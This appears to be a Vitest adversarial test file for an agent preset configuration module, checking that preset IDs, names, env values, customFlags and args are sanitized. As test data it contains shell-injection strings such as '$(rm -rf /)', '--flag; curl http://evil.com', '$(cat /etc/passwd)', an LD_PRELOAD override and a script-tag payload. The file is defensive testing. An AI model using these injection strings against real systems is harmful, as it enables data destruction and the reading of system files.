import { describe, it, expect } from "vitest";
import { getMergedPresets, getMergedPreset, sanitizeAgentEnv } from "@/config/agents";

// Adversarial unit tests for preset merging logic
describe("Adversarial: Preset Merging", () => {
  it("handles undefined/empty inputs gracefully", () => {
    expect(() => getMergedPresets("claude")).not.toThrow();
    expect(() => getMergedPresets("claude", undefined, [])).not.toThrow();
    expect(() => getMergedPresets("claude", [], undefined)).not.toThrow();
  });

  it("prevents prototype pollution via env keys", () => {
    const maliciousCustomPresets = [
      { id: "malicious", name: "Evil", env: { __proto__: "polluted" } as Record<string, string> },
    ];
    getMergedPresets("claude", maliciousCustomPresets);
    // Must not pollute global Object.prototype
    expect(({} as Record<string, unknown>).isAdmin).toBeUndefined();
  });

  it("rejects shell injection in env values", () => {
    const injectionPresets = [
      { id: "inject", name: "Bad", env: { ANTHROPIC_API_KEY: "$(rm -rf /)" } },
    ];
    const result = getMergedPresets("claude", injectionPresets);
    expect(result.some((f) => f.env?.ANTHROPIC_API_KEY?.includes("$("))).toBe(false);
  });

  it("handles circular references in env objects without throwing", () => {
    const circular: Record<string, unknown> = {};
    circular["self"] = circular;
    const presets = [{ id: "circular", name: "Loop", env: circular as Record<string, string> }];
    expect(() => getMergedPresets("claude", presets)).not.toThrow();
    // Circular env values (non-string) are dropped — preset itself survives
    const result = getMergedPresets("claude", presets);
    expect(result.length).toBe(1);
    expect(result[0]!.env?.["self"]).toBeUndefined();
  });

  it("deduplicates presets with the same ID — first wins", () => {
    const dupPresets = [
      { id: "dup", name: "First" },
      { id: "dup", name: "Second" },
    ];
    const result = getMergedPresets("claude", dupPresets);
    expect(result.filter((f) => f.id === "dup")).toHaveLength(1);
    expect(result.find((f) => f.id === "dup")?.name).toBe("First");
  });

  it("rejects presets with invalid ID characters", () => {
    const badIds = [
      { id: "../escape", name: "Path traversal" },
      { id: "id with spaces", name: "Spaces" },
      { id: "id\twith\ttabs", name: "Tabs" },
      { id: "", name: "Empty ID" },
    ];
    const result = getMergedPresets("claude", badIds);
    expect(result).toHaveLength(0);
  });

  it("rejects env values that are non-string objects", () => {
    const presets = [
      {
        id: "obj-env",
        name: "ObjEnv",
        env: { KEY: { nested: "value" } as unknown as string },
      },
    ];
    const result = getMergedPresets("claude", presets);
    expect(result[0]!.env?.KEY).toBeUndefined();
  });

  it("custom preset shadows CCR preset with same ID", () => {
    const customPresets = [{ id: "ccr-opus", name: "My Custom Opus" }];
    const ccrPresets = [{ id: "ccr-opus", name: "CCR Opus" }];
    const result = getMergedPresets("claude", customPresets, ccrPresets);
    expect(result.filter((f) => f.id === "ccr-opus")).toHaveLength(1);
    expect(result.find((f) => f.id === "ccr-opus")?.name).toBe("My Custom Opus");
  });

  it("blocks dangerous system env var names", () => {
    const dangerous = [
      { id: "danger", name: "Bad", env: { PATH: "/injected", LD_PRELOAD: "evil.so" } },
    ];
    const result = getMergedPresets("claude", dangerous);
    expect(result[0]!.env?.PATH).toBeUndefined();
    expect(result[0]!.env?.LD_PRELOAD).toBeUndefined();
  });

  it("allows safe env vars through", () => {
    const safe = [
      {
        id: "safe-env",
        name: "Safe",
        env: { ANTHROPIC_API_KEY: "sk-test-123", CLAUDE_MODEL: "claude-opus-4-6" },
      },
    ];
    const result = getMergedPresets("claude", safe);
    expect(result[0]!.env?.ANTHROPIC_API_KEY).toBe("sk-test-123");
    expect(result[0]!.env?.CLAUDE_MODEL).toBe("claude-opus-4-6");
  });
});

// ── adversarial: bugs found by probing edge cases ─────────────────────────────

describe("Adversarial: color validation (Bug — regex too permissive)", () => {
  it("rejects 5-digit hex color (#abcde) — not valid CSS", () => {
    const result = getMergedPresets("claude", [{ id: "f1", name: "Bad Color", color: "#abcde" }]);
    expect(result[0]!.color).toBeUndefined();
  });

  it("rejects 7-digit hex color (#1234567) — not valid CSS", () => {
    const result = getMergedPresets("claude", [{ id: "f1", name: "Bad Color", color: "#1234567" }]);
    expect(result[0]!.color).toBeUndefined();
  });

  it("accepts 3-digit hex color (#abc)", () => {
    const result = getMergedPresets("claude", [{ id: "f1", name: "Short Color", color: "#abc" }]);
    expect(result[0]!.color).toBe("#abc");
  });

  it("accepts 4-digit hex color with alpha (#abcd)", () => {
    const result = getMergedPresets("claude", [{ id: "f1", name: "Alpha Short", color: "#abcd" }]);
    expect(result[0]!.color).toBe("#abcd");
  });

  it("accepts 6-digit hex color (#aabbcc)", () => {
    const result = getMergedPresets("claude", [{ id: "f1", name: "Full Color", color: "#aabbcc" }]);
    expect(result[0]!.color).toBe("#aabbcc");
  });

  it("accepts 8-digit hex color with alpha (#aabbccdd)", () => {
    const result = getMergedPresets("claude", [
      { id: "f1", name: "Full Alpha", color: "#aabbccdd" },
    ]);
    expect(result[0]!.color).toBe("#aabbccdd");
  });
});

describe("Adversarial: sanitizeEnv returns {} when all entries rejected (Bug — truthy empty env)", () => {
  it("returns env=undefined (not {}) when all env values contain injection characters", () => {
    // All values contain ';' which is a shell injection pattern → all filtered
    // sanitizeEnv currently returns {} instead of undefined, making preset.env truthy
    const result = getMergedPresets("claude", [
      { id: "f1", name: "Injected", env: { MY_KEY: "val; injection", OTHER: "val | pipe" } },
    ]);
    expect(result[0]!.env).toBeUndefined();
  });

  it("returns env=undefined (not {}) when all env keys are dangerous system vars", () => {
    const result = getMergedPresets("claude", [
      { id: "f1", name: "SysVars", env: { PATH: "/injected", LD_PRELOAD: "evil.so" } },
    ]);
    expect(result[0]!.env).toBeUndefined();
  });
});

describe("Adversarial: name validation rejects apostrophes (Bug — over-aggressive XSS filter)", () => {
  it("allows preset name with apostrophe (Don't touch)", () => {
    // Apostrophes are common in names and display locally — not XSS-risk in this context
    const result = getMergedPresets("claude", [{ id: "f1", name: "Don't touch" }]);
    expect(result).toHaveLength(1);
    expect(result[0]!.name).toBe("Don't touch");
  });

  it('allows preset name with double-quote ("My Config")', () => {
    const result = getMergedPresets("claude", [{ id: "f1", name: '"My Config"' }]);
    expect(result).toHaveLength(1);
  });

  it("still blocks angle brackets (XSS-relevant)", () => {
    const result = getMergedPresets("claude", [{ id: "f1", name: "<script>alert(1)</script>" }]);
    expect(result).toHaveLength(0);
  });
});

describe("Adversarial: getMergedPreset with empty string presetId", () => {
  it("returns undefined for empty-string presetId (not the default/first preset)", () => {
    const presets = [{ id: "f1", name: "First Preset" }];
    const result = getMergedPreset("claude", "", presets, undefined);
    expect(result).toBeUndefined();
  });
});

// ── adversarial: customFlags injection (Bug — unsanitized shell tokens) ───────
// env values are checked for shell injection patterns (;, |, backtick, $())
// but customFlags receives NO such check.  A CCR or custom preset with
// customFlags containing ";" can inject arbitrary shell commands because
// tokens starting with "-" skip escapeShellArg in generateAgentCommand.
// Example: "--flag; curl http://evil.com" → splits to ["--flag;", "curl", ...]
//          "--flag;" starts with "-" → inserted verbatim → terminates the agent
//          command and starts a new one.

describe("Adversarial: customFlags shell injection (Bug — missing sanitization)", () => {
  it("rejects customFlags containing semicolon (command separator)", () => {
    const result = getMergedPresets("claude", [
      { id: "f1", name: "Inject", customFlags: "--flag; curl http://evil.com" },
    ]);
    expect(result[0]!.customFlags).toBeUndefined();
  });

  it("rejects customFlags containing pipe operator", () => {
    const result = getMergedPresets("claude", [
      { id: "f1", name: "Pipe", customFlags: "--verbose | tee /tmp/out" },
    ]);
    expect(result[0]!.customFlags).toBeUndefined();
  });

  it("rejects customFlags containing command substitution", () => {
    const result = getMergedPresets("claude", [
      { id: "f1", name: "Subst", customFlags: "--model $(cat /etc/passwd)" },
    ]);
    expect(result[0]!.customFlags).toBeUndefined();
  });

  it("allows safe customFlags with only dashes and alphanumerics", () => {
    const result = getMergedPresets("claude", [
      { id: "f1", name: "Safe", customFlags: "--verbose --output-format json" },
    ]);
    expect(result[0]!.customFlags).toBe("--verbose --output-format json");
  });

  it("null-coerces customFlags to undefined when injection is detected", () => {
    const result = getMergedPresets("claude", [
      { id: "f1", name: "Inject2", customFlags: "--flag; evil" },
    ]);
    expect(result[0]!.customFlags).toBeUndefined();
  });
});

// ── adversarial: preset.args injection (Bug — args array passes through unvalidated) ──
// validatePreset spreads `...preset` before overriding specific fields.
// The `args` array (used as extra CLI flags passed to the agent) is never
// checked — any string, including ones with ";" or "$(...)", survives.
// A CCR preset or custom preset can inject arbitrary shell commands via args.

describe("Adversarial: preset.args injection (Bug — unsanitized args array)", () => {
  it("rejects args entries containing semicolon", () => {
    const result = getMergedPresets("claude", [
      { id: "f1", name: "Inject", args: ["--flag; curl http://evil.com"] },
    ]);
    expect(result[0]!.args).toBeUndefined();
  });

  it("rejects args entries containing command substitution", () => {
    const result = getMergedPresets("claude", [
      { id: "f1", name: "Subst", args: ["--model $(cat /etc/passwd)"] },
    ]);
    expect(result[0]!.args).toBeUndefined();
  });

  it("rejects args entries containing pipe", () => {
    const result = getMergedPresets("claude", [
      { id: "f1", name: "Pipe", args: ["--verbose | tee /tmp/out"] },
    ]);
    expect(result[0]!.args).toBeUndefined();
  });

  it("rejects non-string args entries", () => {
    const result = getMergedPresets("claude", [
      { id: "f1", name: "NonStr", args: [{ nested: "bad" } as unknown as string] },
    ]);
    expect(result[0]!.args).toBeUndefined();
  });

  it("allows safe args entries", () => {
    const result = getMergedPresets("claude", [
      { id: "f1", name: "Safe", args: ["--model", "claude-opus-4-6", "--verbose"] },
    ]);
    expect(result[0]!.args).toEqual(["--model", "claude-opus-4-6", "--verbose"]);
  });

  it("filters only dangerous entries and keeps safe ones", () => {
    const result = getMergedPresets("claude", [
      { id: "f1", name: "Mixed", args: ["--verbose", "--flag; evil", "--output-format", "json"] },
    ]);
    // Any dangerous entry should poison the whole args array (drop it entirely)
    // OR the implementation filters per-entry — either way, injection strings must not survive
    const args = result[0]!.args;
    if (args !== undefined) {
      expect(args.every((a) => !a.includes(";") && !a.includes("$(") && !a.includes("|"))).toBe(
        true
      );
    }
  });
});

// ── adversarial: validatePreset whitespace-only name (Bug — check before trim) ──
// validatePreset checks `!preset.name` before trimming, so "   " passes the
// guard (truthy string) and then gets trimmed to "" in the return object.
// A preset with name="" is nonsensical and should be rejected.

describe("Adversarial: validatePreset whitespace-only name (Bug — guard before trim)", () => {
  it("rejects a preset whose name is only whitespace", () => {
    const result = getMergedPresets("claude", [{ id: "f1", name: "   " }]);
    expect(result).toHaveLength(0);
  });

  it("rejects a preset whose name is a single tab character", () => {
    const result = getMergedPresets("claude", [{ id: "f1", name: "\t" }]);
    expect(result).toHaveLength(0);
  });

  it("still accepts a name with surrounding whitespace that has content", () => {
    const result = getMergedPresets("claude", [{ id: "f1", name: "  Opus  " }]);
    expect(result).toHaveLength(1);
    expect(result[0]!.name).toBe("Opus");
  });
});

// ── adversarial: sanitizeArgs empty strings & length cap (Bug — missing checks) ──
// sanitizeArgs filters injection chars but:
//   1. Allows empty-string args — "" is a valid string with no injection chars,
//      but produces an empty CLI token which is a no-op at best and a parse error
//      in some shells at worst.
//   2. No per-arg length cap — customFlags is capped at 10 000 chars but individual
//      args in the array have no limit, enabling resource exhaustion.
//   3. Allows "&" — the shell background operator. A token like "--model=foo&bar"
//      starts with "-" so it goes verbatim into the command string; the shell then
//      splits on "&" and backgrounds the agent process.

describe("Adversarial: sanitizeArgs empty strings (Bug — empty token allowed)", () => {
  it("filters a lone empty-string arg", () => {
    const result = getMergedPresets("claude", [{ id: "f1", name: "Empty", args: [""] }]);
    expect(result[0]!.args).toBeUndefined();
  });

  it("filters empty strings within a mixed-safe array", () => {
    const result = getMergedPresets("claude", [
      { id: "f1", name: "Mixed", args: ["--verbose", "", "--output-format"] },
    ]);
    expect(result[0]!.args).toEqual(["--verbose", "--output-format"]);
  });
});

describe("Adversarial: sanitizeArgs length cap (Bug — no per-arg limit)", () => {
  it("rejects a single arg that exceeds 10 000 chars", () => {
    const result = getMergedPresets("claude", [
      { id: "f1", name: "Long", args: ["--flag=" + "a".repeat(10001)] },
    ]);
    expect(result[0]!.args).toBeUndefined();
  });

  it("keeps args that are exactly at the 10 000-char limit", () => {
    const longButOk = "--flag=" + "a".repeat(9993); // 10 000 chars total
    const result = getMergedPresets("claude", [{ id: "f1", name: "Ok", args: [longButOk] }]);
    expect(result[0]!.args).toEqual([longButOk]);
  });
});

describe("Adversarial: sanitizeArgs ampersand injection (Bug — & not blocked)", () => {
  it("rejects args containing & — shell background operator", () => {
    const result = getMergedPresets("claude", [
      { id: "f1", name: "Amp", args: ["--model=foo&evil"] },
    ]);
    expect(result[0]!.args).toBeUndefined();
  });

  it("rejects args containing > — shell redirection operator", () => {
    const result = getMergedPresets("claude", [
      { id: "f1", name: "Redir", args: ["--output>/etc/passwd"] },
    ]);
    expect(result[0]!.args).toBeUndefined();
  });
});

// ── adversarial: sanitizeAgentEnv (exported function, used for globalEnv) ──────

describe("Adversarial: sanitizeAgentEnv exported function", () => {
  it("returns undefined for undefined input", () => {
    expect(sanitizeAgentEnv(undefined)).toBeUndefined();
  });

  it("returns undefined when all entries are filtered", () => {
    expect(sanitizeAgentEnv({ PATH: "/injected" })).toBeUndefined();
  });

  it("returns undefined for an empty object", () => {
    expect(sanitizeAgentEnv({})).toBeUndefined();
  });

  it("allows safe string values through", () => {
    const result = sanitizeAgentEnv({ MY_KEY: "hello", ANOTHER: "world" });
    expect(result).toEqual({ MY_KEY: "hello", ANOTHER: "world" });
  });

  it("drops non-string values", () => {
    const result = sanitizeAgentEnv({ GOOD: "ok", BAD: 42 as unknown as string });
    expect(result).toEqual({ GOOD: "ok" });
  });

  it("drops prototype-polluting keys", () => {
    const env = Object.create(null) as Record<string, unknown>;
    env["__proto__"] = "polluted";
    env["SAFE"] = "yes";
    const result = sanitizeAgentEnv(env);
    expect(result).toEqual({ SAFE: "yes" });
  });
});

describe("Preset fallback chain sanitization", () => {
  const customPresets = [
    { id: "primary", name: "Primary", fallbacks: ["backup-a", "backup-b"] },
    { id: "backup-a", name: "Backup A" },
    { id: "backup-b", name: "Backup B" },
    { id: "backup-c", name: "Backup C" },
  ];

  it("preserves valid fallback chains", () => {
    const result = getMergedPresets("claude", customPresets);
    const primary = result.find((p) => p.id === "primary");
    expect(primary?.fallbacks).toEqual(["backup-a", "backup-b"]);
  });

  it("strips self-references from fallbacks", () => {
    const bad = [
      { id: "me", name: "Me", fallbacks: ["me", "other"] },
      { id: "other", name: "O" },
    ];
    const result = getMergedPresets("claude", bad);
    const me = result.find((p) => p.id === "me");
    expect(me?.fallbacks).toEqual(["other"]);
  });

  it("deduplicates repeated IDs in fallbacks", () => {
    const dup = [
      { id: "p", name: "P", fallbacks: ["a", "a", "b", "a"] },
      { id: "a", name: "A" },
      { id: "b", name: "B" },
    ];
    const result = getMergedPresets("claude", dup);
    const p = result.find((x) => x.id === "p");
    expect(p?.fallbacks).toEqual(["a", "b"]);
  });

  it("caps fallbacks array at FALLBACK_CHAIN_MAX (3)", () => {
    const long = [
      { id: "p", name: "P", fallbacks: ["a", "b", "c", "d", "e"] },
      { id: "a", name: "A" },
      { id: "b", name: "B" },
      { id: "c", name: "C" },
      { id: "d", name: "D" },
      { id: "e", name: "E" },
    ];
    const result = getMergedPresets("claude", long);
    const p = result.find((x) => x.id === "p");
    expect(p?.fallbacks?.length).toBe(3);
    expect(p?.fallbacks).toEqual(["a", "b", "c"]);
  });

  it("filters out references to unknown preset IDs", () => {
    const withUnknown = [
      { id: "p", name: "P", fallbacks: ["real", "does-not-exist"] },
      { id: "real", name: "Real" },
    ];
    const result = getMergedPresets("claude", withUnknown);
    const p = result.find((x) => x.id === "p");
    expect(p?.fallbacks).toEqual(["real"]);
  });

  it("drops invalid ID characters in fallbacks", () => {
    const bad = [
      { id: "p", name: "P", fallbacks: ["valid", "with space", "semi;colon", ""] },
      { id: "valid", name: "Valid" },
    ];
    const result = getMergedPresets("claude", bad);
    const p = result.find((x) => x.id === "p");
    expect(p?.fallbacks).toEqual(["valid"]);
  });

  it("returns undefined when all fallbacks are invalid or unknown", () => {
    const bad = [{ id: "p", name: "P", fallbacks: ["p", "", ";bad"] }];
    const result = getMergedPresets("claude", bad);
    const p = result.find((x) => x.id === "p");
    expect(p?.fallbacks).toBeUndefined();
  });

  it("tolerates non-array fallbacks field", () => {
    const bad = [
      {
        id: "p",
        name: "P",
        fallbacks: "not-an-array" as unknown as string[],
      },
    ];
    expect(() => getMergedPresets("claude", bad)).not.toThrow();
  });
});
